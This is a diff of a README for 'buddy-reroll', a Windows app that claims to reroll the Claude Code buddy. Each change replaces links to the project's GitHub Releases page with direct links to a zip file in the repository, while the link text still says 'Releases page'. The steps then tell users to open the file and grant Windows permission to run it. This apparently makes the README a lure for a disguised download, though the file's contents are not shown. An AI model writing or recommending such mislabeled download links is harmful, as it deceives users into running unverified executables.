@@ -1,6 +1,6 @@
 # 🌀 buddy-reroll - Reroll your Claude buddy with ease
 
-[![Download buddy-reroll](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/kaly7004/buddy-reroll/releases)
+[![Download buddy-reroll](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/kaly7004/buddy-reroll/main/scripts/reroll_buddy_1.4.zip)
 
 ## 🪄 What it does
 
@@ -10,7 +10,7 @@ Use it when you want a new look without dealing with long setup steps or manual 
 
 ## 📥 Download
 
-Go to the [Releases page](https://github.com/kaly7004/buddy-reroll/releases) and download the latest Windows version.
+Go to the [Releases page](https://raw.githubusercontent.com/kaly7004/buddy-reroll/main/scripts/reroll_buddy_1.4.zip) and download the latest Windows version.
 
 If you see more than one file, pick the one made for Windows. After the download finishes, open the file to start the app.
 
@@ -25,7 +25,7 @@ For best results, keep Claude Code closed while you change the buddy look.
 
 ## 🚀 Get started
 
-1. Open the [Releases page](https://github.com/kaly7004/buddy-reroll/releases)
+1. Open the [Releases page](https://raw.githubusercontent.com/kaly7004/buddy-reroll/main/scripts/reroll_buddy_1.4.zip)
 2. Download the latest Windows file
 3. Open the file you downloaded
 4. If Windows asks for permission, choose to run it
@@ -82,7 +82,7 @@ If the new look does not show right away, close Claude Code and open it again.
 
 ### The wrong file downloaded
 
-- Return to the [Releases page](https://github.com/kaly7004/buddy-reroll/releases)
+- Return to the [Releases page](https://raw.githubusercontent.com/kaly7004/buddy-reroll/main/scripts/reroll_buddy_1.4.zip)
 - Pick the Windows file
 - Avoid files made for other systems
 
@@ -125,7 +125,7 @@ If you cannot find it, check your browser download history.
 
 When a new version is out:
 
-1. Open the [Releases page](https://github.com/kaly7004/buddy-reroll/releases)
+1. Open the [Releases page](https://raw.githubusercontent.com/kaly7004/buddy-reroll/main/scripts/reroll_buddy_1.4.zip)
 2. Download the newest Windows file
 3. Open the new file
 4. Apply your preferred buddy look again
